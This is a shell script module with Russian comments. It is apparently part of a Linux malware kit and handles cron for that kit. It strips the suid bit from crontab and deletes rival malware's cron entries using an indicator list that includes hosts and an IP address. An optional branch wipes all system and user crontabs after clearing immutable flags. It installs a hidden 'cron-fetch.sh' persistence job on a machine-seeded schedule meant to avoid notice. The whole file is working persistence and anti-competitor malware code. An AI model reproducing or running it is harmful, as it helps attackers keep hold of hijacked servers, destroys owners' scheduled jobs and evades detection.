#!/bin/sh
# 50-cron.sh — работа с cron. Порты cron_health, _cron_sched, harden_crontab_gate,
# scrub_competitor_crons, wipe_previous_crons, create_cronjob.
# Полный снос cron — как у них, без предохранителя (kf_wipe_previous_crons).


# состояние cron: 0 здоров, 1 нельзя ставить, 2 ставим но демон не бежит
kf_cron_health() {
  KF_CRONH=""
  [ "$(id -u)" = "0" ] && { KF_CRONH="root context"; return 0; }
  for _c_m in "$HOME/.gate_stripped" /etc/.dd/.gate_stripped "${KF_ROOT:-/var/tmp/.kf}/.gate_stripped"; do
    [ -f "$_c_m" ] && { KF_CRONH="gate stripped"; return 1; }
  done
  _c_bin=$(command -v crontab 2>/dev/null) || { KF_CRONH="crontab нет"; return 1; }
  case "$(stat -c%A "$_c_bin" 2>/dev/null)" in
    -rws[rx-]*|-rwxr-s[rx-]*|[su]??*) : ;;
    *) KF_CRONH="crontab без suid"; return 1 ;;
  esac
  _c_t=$(crontab -l 2>&1 | head -2)
  case "$_c_t" in
    *"must be suid"*|*"ermission denied"*|*"not authorized"*) KF_CRONH="crontab не работает"; return 1 ;;
  esac
  if ! pgrep -x cron >/dev/null 2>&1 && ! pgrep -x crond >/dev/null 2>&1; then
    KF_CRONH="cron-демон не запущен"; return 2
  fi
  KF_CRONH="healthy"
  return 0
}

# расписание, зависящее от машины (их _cron_sched)
kf_cron_sched() {
  _cs_k="${1:-1}"
  _cs_seed=$( (cat /etc/machine-id 2>/dev/null || cat /proc/sys/kernel/random/boot_id 2>/dev/null || uname -n 2>/dev/null) \
              | tr -cd 'a-fA-F0-9' | cut -c1-48 )
  [ -n "$_cs_seed" ] || _cs_seed="$$$_cs_k"
  _cs_h=$(printf '%s%s' "$_cs_seed" "$_cs_k" | cksum 2>/dev/null | awk '{print $1}')
  case "$_cs_h" in ''|*[!0-9]*) _cs_h=$(( ( $(date +%s) * 31 + _cs_k ) % 65521 )) ;; esac
  _cs_list=$(awk -v h="$_cs_h" -v k="$_cs_k" 'BEGIN{
      x=(((h%65521)*2654435761)+(k*40503))%2147483647
      split("29 31 37 41 43 47 53",P," ")
      step=P[(x%7)+1]; off=(((x%65521)*1103515245+12345)%step); out=""
      for(m=off;m<60;m+=step) out=out (out==""?"":",") m
      printf "%s", out }' 2>/dev/null)
  case "$_cs_list" in ''|*[!0-9,]*) _cs_list='*/45' ;; esac
  printf '%s' "$_cs_list"
}

# снять suid с crontab (их harden_crontab_gate) — только root
kf_harden_crontab_gate() {
  [ "$(id -u)" = "0" ] || return 0
  _g_b=$(command -v crontab 2>/dev/null) || return 0
  _g_pre=$(stat -c%a "$_g_b" 2>/dev/null)
  chmod u-s "$_g_b" 2>/dev/null
  chmod g-s "$_g_b" 2>/dev/null
  mkdir -p /etc/.dd 2>/dev/null && touch /etc/.dd/.gate_stripped 2>/dev/null
  for _g_h in "$HOME" /root; do
    [ -d "$_g_h" ] && touch "$_g_h/.gate_stripped" 2>/dev/null || true
  done
  kf_log "crontab gate: было $_g_pre, suid снят"
}

# снос чужого cron. По умолчанию — только строки/файлы с IOC конкурента,
# системный cron (обновления, бэкапы) остаётся жив: его снос — лишний след.
# KF_FULL_WIPE=1 — старое поведение «как у них»: снести всё.
kf_wipe_previous_crons() {
  if [ "${KF_FULL_WIPE:-0}" != "1" ]; then
    kf_scrub_competitor_crons
    for _w_f in /etc/cron.d/* /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/*; do
      [ -f "$_w_f" ] || continue
      [ "$_w_f" = "/etc/cron.d/kf" ] && continue
      grep -qE "$KF_WP_IOC" "$_w_f" 2>/dev/null && rm -f "$_w_f" 2>/dev/null
    done
    kf_log "cron: вычищены только IOC конкурента (KF_FULL_WIPE=1 — полный снос)"
    return 0
  fi
  if [ "$(id -u)" -eq 0 ]; then
    for _w_l in /etc/cron.d/* /etc/cron.d/apache /var/spool/cron/* /var/spool/cron/crontabs/* \
               /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/* \
               /etc/crontab /etc/cron.hourly/oanacroner1 /etc/init.d/down; do
      [ -e "$_w_l" ] || continue
      chattr -i "$_w_l" 2>/dev/null || true
      chattr -a "$_w_l" 2>/dev/null || true
    done
  fi

  _w_zimbra=0
  [ "$(id -un 2>/dev/null)" = "zimbra" ] && _w_zimbra=1
  [ "$_w_zimbra" = 0 ] && crontab -l 2>/dev/null | grep -qi zimbra && _w_zimbra=1

  if [ "$_w_zimbra" = 1 ]; then
    kf_scrub_competitor_crons
  else
    crontab -r 2>/dev/null || true
  fi

  for _w_us in /var/spool/cron/crontabs/* /var/spool/cron/*; do
    [ -f "$_w_us" ] || continue
    case "$_w_us" in *zimbra*) continue ;; esac
    grep -qi "zimbra" "$_w_us" 2>/dev/null && continue
    rm -f "$_w_us" 2>/dev/null || true
  done

  if [ "$_w_zimbra" = 0 ] && [ "$(id -u)" -eq 0 ]; then
    rm -f /etc/crontab 2>/dev/null || true
    rm -f /etc/cron.d/* 2>/dev/null || true
    rm -f /etc/cron.hourly/* /etc/cron.daily/* /etc/cron.weekly/* /etc/cron.monthly/* 2>/dev/null || true
  fi
  kf_log "cron: полный снос выполнен (как у них)"
}

# поставить свой носитель (их create_cronjob, упрощённо)
kf_create_cronjob() {
  _j_dir="${1:-${KF_ROOT:-/var/tmp/.kf}}"
  # cron_persist.sh кладёт носитель в /etc/.dd или $HOME/.usr_cron/lib, а не в $D
  _j_self=""
  for _j_c in "$_j_dir/cron-fetch.sh" /etc/.dd/cron-fetch.sh \
              "${HOME:-}/.usr_cron/lib/cron-fetch.sh" /var/tmp/.dd/cron-fetch.sh; do
    [ -x "$_j_c" ] && { _j_self="$_j_c"; break; }
  done
  [ -n "$_j_self" ] || return 1
  kf_cron_health; _j_h=$?
  [ "$_j_h" = "1" ] && { kf_log "cron: $KF_CRONH — пропуск"; return 1; }
  _j_min=$(kf_cron_sched 7)
  # user crontab: поле пользователя здесь запрещено, иначе cron молча игнорирует строку
  _j_line="$_j_min * * * * $_j_self >/dev/null 2>&1"
  if crontab -l 2>/dev/null | grep -qF "$_j_self"; then
    kf_log "cron: строка уже стоит"
    return 0
  fi
  { crontab -l 2>/dev/null; echo "$_j_line"; } | crontab - 2>/dev/null \
    && kf_log "cron: строка $_j_min установлена" || kf_log "cron: crontab не принял"
  return 0
}

# --- IOC конкурента (их _WP_IOC, взято 1:1) --------------------------------
KF_WP_IOC='systemdev/cron-fetch|cron-fetch-ppfs|lazyrabbit\.pages\.dev|gistpad\.com|\.usr_cron|/etc/\.dd|oanacroner|kdevtmpfsi|kinsing|\.\.config|bash /tmp/|/tmp/\.[a-z0-9_-]{2,}/|/var/tmp/\.[a-z0-9_-]{2,}/|/dev/shm/\.[A-Za-z0-9_-]|nodebox|kwork|udev-helper|/\.svc/config\.bin|java_update|\.jvbd|\.sysjvd|/\.va\b|scsi_eh|X0_lock|MASKED_RUN|exec -a|\.khp|nm-dog|\.sysd-private|spamassassin/daemon\.sh|31\.56\.209\.189|base64 -d\|[sh]|\.halt/|\.dbus/|\.dl_|--oneshot -q'

# скрипт run-agent.sh может быть легитимным (наш же) — проверяем содержимое
kf_ra_benign() {
  _rb_f="${1:-}"
  [ -f "$_rb_f" ] && [ -r "$_rb_f" ] || return 1
  grep -qE 'k7-|KF_MARK|kf_' "$_rb_f" 2>/dev/null && return 0
  grep -qE 'lazyrabbit|gistpad|cron-fetch|31\.56\.209' "$_rb_f" 2>/dev/null && return 1
  grep -qE '^#!.*sh' "$_rb_f" 2>/dev/null || return 1
  return 0
}

# --- 9. почистить cron от IOC конкурента ------------------------------------
kf_scrub_competitor_crons() {
  command -v crontab >/dev/null 2>&1 || return 0
  _sc_cur=$(crontab -l 2>/dev/null) || return 0
  [ -n "$_sc_cur" ] || return 0
  _sc_ioc="$KF_WP_IOC"
  if kf_ra_benign /tmp/run-agent.sh; then
    :
  else
    _sc_ioc="$_sc_ioc|run-agent\.sh"
  fi
  # наш собственный носитель не трогаем: его путь матчится IOC-шаблоном /var/tmp/\.[a-z0-9_-]{2,}/
  _sc_own="${KF_ROOT:-${D:-/var/tmp/.kf}}"
  printf '%s\n' "$_sc_cur" | while IFS= read -r _sc_line; do
    case "$_sc_line" in *"$_sc_own"*) printf '%s\n' "$_sc_line"; continue ;; esac
    printf '%s\n' "$_sc_line" | grep -qE "$_sc_ioc" || printf '%s\n' "$_sc_line"
  done | crontab - 2>/dev/null \
    && kf_log "cron: сняты строки конкурента" \
    || kf_log "cron: чистка не удалась (crontab не тронут)"
  return 0
}
